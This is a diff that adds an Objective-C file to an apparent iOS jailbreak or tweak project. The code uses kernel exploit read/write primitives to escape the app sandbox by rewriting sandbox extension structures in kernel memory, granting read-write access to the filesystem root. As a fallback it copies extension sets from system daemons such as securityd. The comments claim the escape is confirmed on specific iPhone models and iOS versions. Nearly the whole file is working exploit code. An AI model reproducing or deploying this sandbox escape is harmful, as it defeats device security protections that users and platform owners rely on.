@@ -1,0 +1,374 @@
+#import <Foundation/Foundation.h>
+#import <sys/mount.h>
+#import <sys/stat.h>
+#import <sys/types.h>
+#import <stdbool.h>
+#import <limits.h>
+#import <dispatch/dispatch.h>
+#import <stdarg.h>
+#import <stdlib.h>
+#import <string.h>
+#import <stddef.h>
+
+#import "sandbox.h"
+#import "../kexploit/kexploit_opa334.h"
+#import "../kexploit/krw.h"
+#import "../kexploit/kutils.h"
+#import "../kexploit/vnode.h"
+#import "../kexploit/offsets.h"
+#import "../kexploit/xpaci.h"
+#import "../research/sandbox_research.h"
+#import "../utils/tweak_log.h"
+#import "../utils/state.h"
+#include <stdatomic.h>
+
+static bool g_patch_sandbox_ext_done = false;
+
+static bool is_kernel_ptr(uint64_t ptr) {
+    return (ptr >= VM_MIN_KERNEL_ADDRESS && ptr <= VM_MAX_KERNEL_ADDRESS);
+}
+
+static uint64_t proc_get_cred_label_dbg(uint64_t proc) {
+    if (!proc) {
+        TweakLog("[SSV] proc_get_cred_label_dbg: proc is NULL");
+        return 0;
+    }
+    uint64_t p_proc_ro = kread_ptr(proc + off_proc_p_proc_ro);
+    TweakLog("[SSV] proc_get_cred_label_dbg: proc=0x%llx off_proc_p_proc_ro=0x%x p_proc_ro=0x%llx", proc, off_proc_p_proc_ro, p_proc_ro);
+    if (!p_proc_ro) {
+        TweakLog("[SSV] proc_get_cred_label_dbg: p_proc_ro is NULL");
+        return 0;
+    }
+    uint64_t ucred_raw = kread64(p_proc_ro + off_proc_ro_p_ucred);
+    uint64_t ucred = kread_ptr(p_proc_ro + off_proc_ro_p_ucred);
+    TweakLog("[SSV] proc_get_cred_label_dbg: off_proc_ro_p_ucred=0x%x ucred_raw=0x%llx ucred_ptr=0x%llx", off_proc_ro_p_ucred, ucred_raw, ucred);
+    if (!ucred) {
+        TweakLog("[SSV] proc_get_cred_label_dbg: ucred is NULL");
+        return 0;
+    }
+    // Basic sanity check before touching the label pointer.
+    if (!is_kernel_ptr(ucred)) {
+        TweakLog("[SSV] proc_get_cred_label_dbg: ucred=0x%llx doesn't look like valid kernel address", ucred);
+        return 0;
+    }
+    uint64_t label_raw = kread64(ucred + off_ucred_cr_label);
+    uint64_t label_ptr = kread_ptr(ucred + off_ucred_cr_label);
+    TweakLog("[SSV] proc_get_cred_label_dbg: off_ucred_cr_label=0x%x label_raw=0x%llx label_ptr=0x%llx", off_ucred_cr_label, label_raw, label_ptr);
+    if (is_kernel_ptr(label_ptr)) return label_ptr;
+    if (is_kernel_ptr(label_raw)) return label_raw;
+    TweakLog("[SSV] proc_get_cred_label_dbg: both label pointers invalid");
+    return 0;
+}
+
+static uint64_t label_get_sandbox_dbg(uint64_t label) {
+    if (!label) {
+        TweakLog("[SSV] label_get_sandbox_dbg: label is NULL");
+        return 0;
+    }
+    if (!is_kernel_ptr(label)) {
+        TweakLog("[SSV] label_get_sandbox_dbg: label=0x%llx outside kernel range [0x%llx,0x%llx]",
+                   label, VM_MIN_KERNEL_ADDRESS, VM_MAX_KERNEL_ADDRESS);
+        return 0;
+    }
+    if ((label & 0x7) != 0) {
+        TweakLog("[SSV] label_get_sandbox_dbg: label=0x%llx is not 8-byte aligned", label);
+        return 0;
+    }
+    uint64_t sbx_raw = kread64(label + off_label_l_perpolicy_sandbox);
+    uint64_t sbx_ptr = kread_ptr(label + off_label_l_perpolicy_sandbox);
+    TweakLog("[SSV] label_get_sandbox_dbg: off_label_l_perpolicy_sandbox=0x%x sbx_raw=0x%llx sbx_ptr=0x%llx", off_label_l_perpolicy_sandbox, sbx_raw, sbx_ptr);
+    if (is_kernel_ptr(sbx_ptr)) return sbx_ptr;
+    if (is_kernel_ptr(sbx_raw)) return sbx_raw;
+    TweakLog("[SSV] label_get_sandbox_dbg: both sandbox pointers invalid");
+    return 0;
+}
+
+// The original idea is from https://x.com/CrazyMind90/status/2040484080622465056
+// Kudos to CrazyMind90 for revealing new sbx escape technique!
+// This is almost same behavior with sandbox_extension_consume with r/w on root
+// Confirmed works on iPhone 14 Pro/17.2.1, iPhone SE3/26.0
+int patch_sandbox_ext(void) {
+    TweakLog("[SSV] patch_sandbox_ext start");
+    if (g_patch_sandbox_ext_done) {
+        TweakLog("[SSV] patch_sandbox_ext already marked done, verifying rw and skipping writes");
+        if (check_sandbox_var_rw() == 0) {
+            TweakLog("[SSV] rw still active, returning success");
+            return 0;
+        }
+        TweakLog("[SSV] rw verification failed, clearing done flag and retrying patch");
+        g_patch_sandbox_ext_done = false;
+    }
+    if (!exploit_is_done()) {
+        TweakLog("[SSV] Exploit not done, cannot patch sandbox");
+        return -1;
+    }
+    if (check_sandbox_var_rw() == 0) {
+        TweakLog("[SSV] rw already active before patch, skipping kernel writes");
+        g_patch_sandbox_ext_done = true;
+        return 0;
+    }
+    exploit_set_patching(true);
+    TweakLog("[SSV] Flag set, getting proc cred label");
+    uint64_t self_proc = proc_self();
+    TweakLog("[SSV] proc_self returned 0x%llx", self_proc);
+    if (!self_proc) {
+        TweakLog("[SSV] ERROR: proc_self returned NULL");
+        exploit_set_patching(false);
+        return -1;
+    }
+    TweakLog("[SSV] Calling proc_get_cred_label");
+    uint64_t label = proc_get_cred_label_dbg(self_proc);
+    TweakLog("[SSV] proc_get_cred_label returned 0x%llx", label);
+    if (!label) {
+        TweakLog("[SSV] ERROR: proc_get_cred_label returned NULL");
+        exploit_set_patching(false);
+        return -1;
+    }
+    TweakLog("[SSV] Calling label_get_sandbox with label 0x%llx", label);
+    uint64_t sbx = label_get_sandbox_dbg(label);
+    TweakLog("[SSV] label_get_sandbox returned 0x%llx", sbx);
+    if (!sbx) {
+        TweakLog("[SSV] ERROR: label_get_sandbox returned NULL");
+        exploit_set_patching(false);
+        return -1;
+    }
+    if (sbx < VM_MIN_KERNEL_ADDRESS || sbx > VM_MAX_KERNEL_ADDRESS) {
+        TweakLog("[SSV] ERROR: sandbox ptr 0x%llx outside kernel range", sbx);
+        exploit_set_patching(false);
+        return -1;
+    }
+    TweakLog("[SSV] Reading sandbox_label struct from 0x%llx", sbx);
+    struct sandbox_label sbx_lbl = {0};
+    kreadbuf(sbx, &sbx_lbl, sizeof(struct sandbox_label));
+
+    int maxRetries = 3;
+    for (int retry = 0; retry < maxRetries; retry++) {
+        TweakLog("[SSV] Patch attempt %d/%d", retry + 1, maxRetries);
+        if (retry > 0) {
+            TweakLog("[SSV] Retrying after %dms backoff", retry * 500);
+            usleep(retry * 500000);
+            // Re-read state in case kernel memory layout shifted
+            kreadbuf(sbx, &sbx_lbl, sizeof(struct sandbox_label));
+        }
+    TweakLog("[SSV] Read sandbox label ok, size=%zu", sizeof(struct sandbox_label));
+    uint64_t ext_set_kptr = (uint64_t)sbx_lbl.extension_set;
+    TweakLog("[SSV] Extension set kptr: 0x%llx", ext_set_kptr);
+    
+    struct extension_set ext_set = {0};
+    TweakLog("[SSV] Reading extension_set from 0x%llx, size=%zu", ext_set_kptr, sizeof(struct extension_set));
+    kreadbuf(ext_set_kptr, &ext_set, sizeof(struct extension_set));
+    TweakLog("[SSV] Read extension set ok");
+    for(int i = 0; i < 9; i++) {
+        uint64_t ext_class_node_kptr = (uint64_t)ext_set.type_buckets[i];
+        if(ext_class_node_kptr != 0) {
+            TweakLog("[SSV] Processing bucket %d: 0x%llx", i, ext_class_node_kptr);
+            struct extension_class_node ext_class_node = {0};
+            kreadbuf(ext_class_node_kptr, &ext_class_node, sizeof(ext_class_node));
+            TweakLog("[SSV] Read ext_class_node ok, size=%zu", sizeof(struct extension_class_node));
+            TweakLog("[SSV] class_name pointer: 0x%llx, ext_list_head: 0x%llx", 
+                       (uint64_t)ext_class_node.class_name, (uint64_t)ext_class_node.ext_list_head);
+            
+            uint64_t class_name_kptr = (uint64_t)ext_class_node.class_name;
+            if (!is_kernel_ptr(class_name_kptr)) {
+                TweakLog("[SSV] class_name pointer 0x%llx invalid — skip", class_name_kptr);
+                continue;
+            }
+            char name[256] = {0};
+            TweakLog("[SSV] Reading class_name from 0x%llx", class_name_kptr);
+            kreadbuf(class_name_kptr, name, 256-1);
+            TweakLog("[SSV] Read completed, checking buffer");
+            // Log first 16 bytes as hex for safety
+            TweakLog("[SSV] Buffer[0-3]: %02x %02x %02x %02x", name[0], name[1], name[2], name[3]);
+            TweakLog("[SSV] Class name: %s", name);
+            
+            bool isContainerClass = (strstr(name, "com.apple.sandbox.container") != NULL);
+            bool isReadWriteClass = (strstr(name, "com.apple.app-sandbox.read-write") != NULL);
+            bool isCandidateClass = (isContainerClass || isReadWriteClass);
+            TweakLog("[SSV] class match: container=%d read_write=%d candidate=%d",
+                       isContainerClass ? 1 : 0,
+                       isReadWriteClass ? 1 : 0,
+                       isCandidateClass ? 1 : 0);
+            if (!isCandidateClass) {
+                continue;
+            }
+            
+            uint64_t ext_kptr = (uint64_t)ext_class_node.ext_list_head;
+            if (!ext_kptr) continue;
+            TweakLog("[SSV] Extension kptr: 0x%llx", ext_kptr);
+            
+            struct extension ext = {0};
+            kreadbuf(ext_kptr, &ext, sizeof(ext));
+            TweakLog("[SSV] Read extension ok");
+            uint64_t path_buf = (uint64_t)ext.data_ptr;
+            TweakLog("[SSV] Path buf: 0x%llx", path_buf);
+            if (!is_kernel_ptr(path_buf)) {
+                TweakLog("[SSV] path_buf 0x%llx is not a valid kernel pointer, skip", path_buf);
+                continue;
+            }
+            char originalPath[256] = {0};
+            kreadbuf(path_buf, originalPath, sizeof(originalPath) - 1);
+            TweakLog("[SSV] Original extension path: %s", originalPath);
+            bool pathIsRoot = (strcmp(originalPath, "/") == 0);
+            if (isReadWriteClass && pathIsRoot) {
+                TweakLog("[SSV] Extension already read-write on root, skipping kernel rewrites");
+                TweakLog("[SSV] Calling check_sandbox_var_rw");
+                if(check_sandbox_var_rw() == -1) {
+                    TweakLog("[SSV] check_sandbox_var_rw FAILED");
+                    exploit_set_patching(false);
+                    return -1;
+                }
+                TweakLog("[SSV] check_sandbox_var_rw succeeded");
+                TweakLog("[SSV] patch_sandbox_ext succeeded (no-op)");
+                g_patch_sandbox_ext_done = true;
+                exploit_set_patching(false);
+                return 0;
+            }
+            if (pathIsRoot) {
+                TweakLog("[SSV] Path is already root but class is not read-write, skipping risky in-place string rewrite");
+                continue;
+            }
+            
+            const char *new_class = "com.apple.app-sandbox.read-write";
+            size_t classLen = strlen(new_class) + 1;  // 33 incl NUL
+            size_t totalLen = 2 + classLen;           // 35: "/\0" + class + "\0"
+            size_t bufCapacity = (size_t)ext.path_len; // kernel allocation size
+
+            // A3.8: never write past the kernel allocation. If the data
+            // buffer is too small for path+class, rewrite the path only and
+            // skip the class rename (best-effort) — never overflow.
+            bool classFits = (bufCapacity >= totalLen);
+            if (classFits) {
+                uint8_t *new_ext_data = (uint8_t *)calloc(1, totalLen);
+                if (!new_ext_data) { TweakLog("[SSV] alloc failed for new_ext_data"); continue; }
+                new_ext_data[0] = '/'; new_ext_data[1] = '\0';
+                memcpy(new_ext_data + 2, new_class, classLen);
+                kwritebuf(path_buf, new_ext_data, totalLen);
+                free(new_ext_data);
+                TweakLog("[SSV] Wrote root path + class name (%zu bytes)", totalLen);
+            } else {
+                TweakLog("[SSV] ext data buffer too small (%zu < %zu) — writing path only, no overflow", bufCapacity, totalLen);
+                uint8_t path_only[3] = {'/', '\0', '\0'};
+                size_t wlen = (bufCapacity >= 3) ? 3 : bufCapacity;
+                if (wlen > 0) kwritebuf(path_buf, path_only, wlen);
+            }
+            
+            if (!isReadWriteClass) {
+                if (!classFits) {
+                    TweakLog("[SSV] Class name does not fit in ext data buffer — skipping class node rewrite");
+                } else {
+                    uint8_t cn_buf[0x20];
+                    kreadbuf(ext_class_node_kptr, cn_buf, 0x20);
+                    TweakLog("[SSV] Read class node buf ok");
+                    *(uint64_t *)(cn_buf + offsetof(struct extension_class_node, class_name)) = path_buf + 2;
+                    kwrite_zone_element(ext_class_node_kptr, cn_buf, 0x20);
+                    TweakLog("[SSV] Wrote back class node");
+                }
+            } else {
+                TweakLog("[SSV] Class already read-write, skipped class node rewrite");
+            }
+            
+            kwrite64(ext_kptr + offsetof(struct extension, path_len), 1);
+            kwrite8(ext_kptr + offsetof(struct extension, file.consumed), 1);
+            kwrite8(ext_kptr + offsetof(struct extension, file.storage_class), SC_ISSUED);
+            TweakLog("[SSV] Wrote len and flags");
+            
+            struct stat st;
+            stat("/", &st);
+            kwrite32(ext_kptr + offsetof(struct extension, file.st_dev), (uint32_t)st.st_dev);
+            kwrite64(ext_kptr + offsetof(struct extension, st_ino), (uint64_t)st.st_ino);
+            TweakLog("[SSV] Wrote stat info");
+            
+            if (!isReadWriteClass) {
+                kwrite64(ext_set_kptr + offsetof(struct extension_set, type_buckets[0]), ext_class_node_kptr);
+                TweakLog("[SSV] Updated type buckets");
+            } else {
+                TweakLog("[SSV] Skipped type bucket rewrite for read-write class");
+            }
+            
+            TweakLog("[SSV] Calling check_sandbox_var_rw");
+            if(check_sandbox_var_rw() == -1) {
+                TweakLog("[SSV] check_sandbox_var_rw FAILED on attempt %d", retry + 1);
+                continue; // try next retry iteration
+            }
+            TweakLog("[SSV] check_sandbox_var_rw succeeded");
+
+            TweakLog("[SSV] patch_sandbox_ext succeeded");
+            g_patch_sandbox_ext_done = true;
+            exploit_set_patching(false);
+            return 0;
+        }
+    }
+    } // end retry loop
+    
+    // Fallback: try to borrow sandbox extensions from system daemons
+    static const char *borrowTargets[] = { "cfprefsd", "securityd", "notifyd", "lsd", NULL };
+    int t;
+    for (t = 0; borrowTargets[t]; t++) {
+        TweakLog("[SSV] Trying borrow_sandbox_ext from '%s'", borrowTargets[t]);
+        int borrowRet = borrow_sandbox_ext(borrowTargets[t]);
+        if (borrowRet == 0) {
+            TweakLog("[SSV] borrow_sandbox_ext from '%s' succeeded, verifying rw", borrowTargets[t]);
+            if (check_sandbox_var_rw() == 0) {
+                g_patch_sandbox_ext_done = true;
+                exploit_set_patching(false);
+                return 0;
+            }
+        }
+    }
+    TweakLog("[SSV] All attempts failed (retry loop + %d borrow targets)", t);
+    exploit_set_patching(false);
+    return -1;
+}
+
+int check_sandbox_var_rw(void) {
+    pid_t pid = getpid();
+    TweakLog("[SSV] check_sandbox_var_rw start pid=%d", pid);
+    int r = sandbox_check(pid, "file-read-data",  SANDBOX_FILTER_PATH | SANDBOX_CHECK_NO_REPORT, "/private/var");
+    int w = sandbox_check(pid, "file-write-data", SANDBOX_FILTER_PATH | SANDBOX_CHECK_NO_REPORT, "/private/var");
+    TweakLog("[SSV] check_sandbox_var_rw result r=%d w=%d", r, w);
+    return (r == 0 && w == 0) ? 0 : -1;
+}
+
+int borrow_sandbox_ext(const char* process) {
+    if (!process) return -1;
+    uint64_t self_proc = proc_self();
+    if (!self_proc) return -1;
+
+    uint64_t self_label = proc_get_cred_label(self_proc);
+    if (!self_label) return -1;
+    uint64_t self_sbx = label_get_sandbox(self_label);
+    if (!self_sbx) return -1;
+    
+    struct sandbox_label self_sbx_lbl = {0};
+    kreadbuf(self_sbx, &self_sbx_lbl, sizeof(struct sandbox_label));
+    uint64_t self_ext_set_kptr = xpaci((uint64_t)self_sbx_lbl.extension_set);
+    TweakLog("[SSV] borrow self_sbx_lbl->ext_set = 0x%llx", self_ext_set_kptr);
+
+    uint64_t victim_proc = proc_find_by_name(process);
+    if (!victim_proc) {
+        TweakLog("[SSV] borrow_sandbox_ext: process '%s' not found", process);
+        return -1;
+    }
+    uint64_t victim_label = proc_get_cred_label(victim_proc);
+    if (!victim_label) return -1;
+    uint64_t victim_sbx = label_get_sandbox(victim_label);
+    if (!victim_sbx) return -1;
+    
+    struct sandbox_label victim_sbx_lbl = {0};
+    kreadbuf(victim_sbx, &victim_sbx_lbl, sizeof(struct sandbox_label));
+    uint64_t victim_ext_set_kptr = xpaci((uint64_t)victim_sbx_lbl.extension_set);
+    TweakLog("[SSV] borrow victim_sbx_lbl->ext_set = 0x%llx", victim_ext_set_kptr);
+    
+    
+    struct extension_set self_ext_set = {0};
+    kreadbuf(self_ext_set_kptr, &self_ext_set, sizeof(struct extension_set));
+    struct extension_set victim_ext_set = {0};
+    kreadbuf(victim_ext_set_kptr, &victim_ext_set, sizeof(struct extension_set));
+    
+    for(int i = 0; i < 9; i++) {
+        uint64_t what = kread64(victim_ext_set_kptr + offsetof(struct extension_set, type_buckets[i]));
+        kwrite64(self_ext_set_kptr + offsetof(struct extension_set, type_buckets[i]), what);
+    }
+    
+    return 0;
+}
